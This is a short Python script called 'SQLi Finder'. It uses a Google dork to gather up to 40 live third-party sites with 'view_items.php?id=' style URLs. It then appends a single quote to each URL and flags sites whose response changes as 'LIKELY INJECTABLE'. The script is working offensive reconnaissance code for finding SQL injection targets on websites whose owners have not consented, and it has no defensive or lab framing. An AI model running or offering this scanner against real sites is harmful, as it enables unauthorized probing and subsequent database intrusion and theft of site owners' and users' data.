#!/usr/bin/python3
from googlesearch import search
import requests, argparse

parser = argparse.ArgumentParser(description='SQLi Finder')
parser.add_argument('-p', type=str, help='Google dork (optional)')
args = parser.parse_args()
par = args.p

print(" ____     ___ __ __    ___  ____   _      __ __     ")
print("|    \   /  _]  |  |  /  _]|    \ | |    |  |  |    ")
print("|  o  ) /  [_|  |  | /  [_ |  D  )| |    |  |  |    ")
print("|     ||    _]  |  ||    _]|    / | |___ |  ~  |    ")
print("|  O  ||   [_|  :  ||   [_ |    \ |     ||___, |    ")
print("|     ||     |\   / |     ||  .  \|     ||     |    ")
print("|_____||_____| \_/  |_____||__|\_||_____||____/     ")
print("                                                    ")


print("Scanning for Vulnerable Web Pages, please hold...")
if not par:
    pes = "inurl:view_items.php?id="
else:
    pes = par
for j in search(pes, tld="com", num=10, stop=40, pause=60):

    try:
        res = requests.get(j).content
        site = j + "'"
        res2 = requests.get(site).content
        if res != res2:
            print(j, " - LIKELY INJECTABLE")
        else:
            print(j, " - Unlikely Injectable")
    except requests.exceptions.RequestException:
        pass
    except KeyboardInterrupt:
        print("\nCtrl+C Pressed\nQuitting.")
        quit()

